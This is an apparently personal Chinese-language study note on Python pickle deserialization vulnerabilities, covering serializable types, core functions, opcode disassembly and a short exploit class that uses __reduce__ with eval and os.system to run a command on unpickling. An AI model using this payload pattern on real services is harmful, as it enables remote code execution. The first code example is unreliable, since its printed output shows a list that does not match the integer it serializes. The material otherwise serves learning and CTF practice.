## 记录一下Pickle反序列化，只总结漏洞方面的，不考虑开发

## 介绍

同**php的反序列化相似**(不然为什么叫反序列化呢🤣)，python也有序列化以长期储存内存中的数据

python中反序列化的库主要有两个，`pickle`和`cPickle`，这俩除了运行效率上有区别外，其他没啥区别
(当然有yaml，python还有有另一个更原始的序列化包marshal，现在开发时一般使用pickle)

pickle实际上可以看作一种**独立的语言**，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到(pickle解析能力大于pickle生成能力)

pickle序列化后的数据不同于json和php序列化，是**不可读的**

## 使用

### 可序列化的对象

- `None` 、 `True` 和 `False`

- 整数、浮点数、复数

- str、byte、bytearray

- 只包含可封存对象的集合，包括 tuple、list、set 和 dict

- 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）

- 定义在模块最外层的内置函数

- 定义在模块最外层的类

- `__dict__` 属性值或 `__getstate__()` 函数的返回值可以被序列化的类(详见官方文档的Pickling Class Instances)

### 基本函数

> **pickle.dump(obj,file[,protocol])**
>
> 序列化对象，并将结果数据流写入到文件对象中，protocol可选择模式，默认为0，文本形式序列化，还可以是1或2，二进制形式序列化。
>
> 注：pickle.dumps()将对象obj对象序列化并返回一个byte对象，所以直接用这个函数生成后打印也是一样的

> **pickle.load(file)**
>
> 反序列化对象。注意要让python找到类的定义，否则报错。
>
> 注：pickle.loads(),从字节对象中读取被封装的对象

> **pickletools.dis(data)**
>
> 可以将不可读的序列化字节转为可读的形式

例子

```py
import pickle
import pickletools

a=123
b=pickle.dumps(a)
print(b)
print(pickle.loads(b))
pickletools.dis(b)

b'\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x01a\x94\x8c\x01b\x94\x8c\x01c\x94e.'
['a', 'b', 'c']
    0: \x80 PROTO      4
    2: \x95 FRAME      17
   11: ]    EMPTY_LIST
   12: \x94 MEMOIZE    (as 0)
   13: (    MARK
   14: \x8c     SHORT_BINUNICODE 'a'
   17: \x94     MEMOIZE    (as 1)
   18: \x8c     SHORT_BINUNICODE 'b'
   21: \x94     MEMOIZE    (as 2)
   22: \x8c     SHORT_BINUNICODE 'c'
   25: \x94     MEMOIZE    (as 3)
   26: e        APPENDS    (MARK at 13)
   27: .    STOP
highest protocol among opcodes = 4
```

可以看到转换成了汇编语言，这里就不提pickle具体是怎样运作的了，详见[先知社区](https://xz.aliyun.com/t/7436)

## 漏洞利用

**任意代码执行或命令执行。**

**变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的**

### 简单的exp

```py
import pickle
class People(object):
    def __init__(self,name="test"):
        self.name=name
   
    def __reduce__(self):
        return (eval,("__import__('os').system('ls -la')",)) #命令执行
 
a = People()
c = pickle.dumps(a)
print(c)
pickle.loads(c)
```

但是很多时候这些方法都是被ban了的，想要做的话就得自己重写**opcode**，目前底层的学习不精，遇到题或底层学好一点了再来好好总结

[美团杯easypickle](https://blog.csdn.net/Sapphire037/article/details/126919498)